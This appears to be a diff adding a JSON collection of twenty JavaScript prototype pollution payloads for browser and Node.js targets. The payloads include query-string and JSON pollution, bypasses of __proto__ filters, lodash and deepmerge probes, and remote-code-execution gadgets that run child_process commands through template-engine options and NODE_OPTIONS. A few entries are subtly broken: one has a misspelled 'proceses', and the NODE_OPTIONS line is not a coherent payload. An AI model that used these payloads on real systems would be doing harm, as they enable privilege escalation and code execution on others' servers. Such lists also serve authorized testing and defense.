@@ -1,0 +1,36 @@
+{
+  "meta": {
+    "name": "Prototype Pollution",
+    "icon": "⚙️",
+    "description": "JavaScript prototype pollution payloads for client-side and server-side (Node.js) exploitation. Covers __proto__, constructor.prototype, JSON-based pollution, and gadget chains.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 20
+  },
+  "payloads": [
+    {"id":1,"code":"?__proto__[admin]=1","description":"URL query pollution — sets Object.prototype.admin=1 via __proto__ query param","category":"query-pollution","platform":["nodejs","browser"],"tags":["prototype","__proto__","url","query"]},
+    {"id":2,"code":"?__proto__.admin=1","description":"Dot-notation URL pollution — alternative to bracket notation","category":"query-pollution","platform":["nodejs","browser"],"tags":["prototype","__proto__","url","dot-notation"]},
+    {"id":3,"code":"?constructor[prototype][admin]=1","description":"Constructor prototype pollution via URL — bypasses __proto__ string filters","category":"query-pollution","platform":["nodejs","browser"],"tags":["prototype","constructor","url","bypass"]},
+    {"id":4,"code":"?constructor.prototype.admin=1","description":"Constructor dot-notation URL pollution","category":"query-pollution","platform":["nodejs","browser"],"tags":["prototype","constructor","url"]},
+
+    {"id":5,"code":"{\"__proto__\":{\"admin\":true}}","description":"JSON body prototype pollution — merge/assign functions may propagate __proto__","category":"json-pollution","platform":["nodejs","browser"],"tags":["prototype","__proto__","json","body"]},
+    {"id":6,"code":"{\"__proto__\":{\"isAdmin\":true,\"role\":\"admin\"}}","description":"Multi-property JSON pollution — sets multiple prototype properties at once","category":"json-pollution","platform":["nodejs","browser"],"tags":["prototype","__proto__","json","privilege"]},
+    {"id":7,"code":"{\"constructor\":{\"prototype\":{\"admin\":true}}}","description":"JSON constructor prototype pollution — avoids __proto__ literal check","category":"json-pollution","platform":["nodejs","browser"],"tags":["prototype","constructor","json","bypass"]},
+    {"id":8,"code":"{\"__proto__\":{\"outputFunctionName\":\"x;process.mainModule.require('child_process').exec('id')//\"}}","description":"Prototype pollution RCE gadget via template engine outputFunctionName (pug/jade)","category":"rce-gadgets","platform":["nodejs"],"tags":["prototype","rce","pug","template","gadget"]},
+    {"id":9,"code":"{\"__proto__\":{\"escapeFunction\":\"JSON.stringify; process.mainModule.require('child_process').exec('id')\"}}","description":"Prototype pollution RCE via escapeFunction gadget — another template engine gadget","category":"rce-gadgets","platform":["nodejs"],"tags":["prototype","rce","template","gadget"]},
+    {"id":10,"code":"{\"__proto__\":{\"sourceURL\":\"\\nproceses.mainModule.require('child_process').exec('id')\"}}","description":"Prototype pollution via sourceURL gadget — node.js vm module source evaluation","category":"rce-gadgets","platform":["nodejs"],"tags":["prototype","rce","vm","sourceURL","gadget"]},
+
+    {"id":11,"code":"Object.prototype.admin = true;","description":"Direct prototype pollution in JS console — for client-side testing","category":"client-side","platform":["browser"],"tags":["prototype","client-side","console","admin"]},
+    {"id":12,"code":"{}.__proto__.admin = true; console.log(({}).admin);","description":"Prototype pollution verification — confirms pollution spreads to new empty objects","category":"client-side","platform":["browser"],"tags":["prototype","client-side","verify"]},
+    {"id":13,"code":"fetch('/api/endpoint?__proto__[admin]=true', {credentials:'include'})","description":"Fetch-based prototype pollution probe — sends polluting query param to API","category":"client-side","platform":["browser"],"tags":["prototype","client-side","fetch","api"]},
+
+    {"id":14,"code":"const merge = (a, b) => { for (let k in b) a[k] = b[k]; return a; }; merge({}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'));","description":"Vulnerable merge function demo — for-in loop copies __proto__ key as own property","category":"nodejs-gadgets","platform":["nodejs"],"tags":["prototype","nodejs","merge","vulnerable-pattern"]},
+    {"id":15,"code":"const _ = require('lodash'); _.merge({}, JSON.parse('{\"__proto__\":{\"admin\":true}}'));","description":"Lodash pre-4.17.12 prototype pollution via _.merge — classic CVE-2019-10744","category":"nodejs-gadgets","platform":["nodejs"],"tags":["prototype","nodejs","lodash","cve","merge"]},
+    {"id":16,"code":"const deepmerge = require('deepmerge'); deepmerge({},{\"__proto__\":{\"admin\":true}});","description":"deepmerge library prototype pollution — affects vulnerable versions","category":"nodejs-gadgets","platform":["nodejs"],"tags":["prototype","nodejs","deepmerge","library"]},
+    {"id":17,"code":"process.env.NODE_OPTIONS=--require /proc/self/environ","description":"Node.js prototype pollution leading to RCE via NODE_OPTIONS pollution","category":"rce-gadgets","platform":["nodejs"],"tags":["prototype","nodejs","node-options","env","rce"]},
+
+    {"id":18,"code":"{\"__proto__\":{\"shell\":\"node\",\"NODE_OPTIONS\":\"--inspect=0.0.0.0:1337\"}}","description":"Prototype pollution → Node.js debugger exposure via NODE_OPTIONS","category":"rce-gadgets","platform":["nodejs"],"tags":["prototype","rce","debugger","node-options"]},
+    {"id":19,"code":"{\"__proto__\":{\"content-type\":\"application/json\"}}","description":"Prototype pollution for HTTP request smuggling — pollutes default content-type headers","category":"client-side","platform":["nodejs","browser"],"tags":["prototype","header-injection","http"]},
+    {"id":20,"code":"a[__proto__][admin]=1","description":"Form URL-encoded prototype pollution — works in POST body with qs or body-parser","category":"json-pollution","platform":["nodejs"],"tags":["prototype","urlencoded","qs","body-parser"]}
+  ]
+}
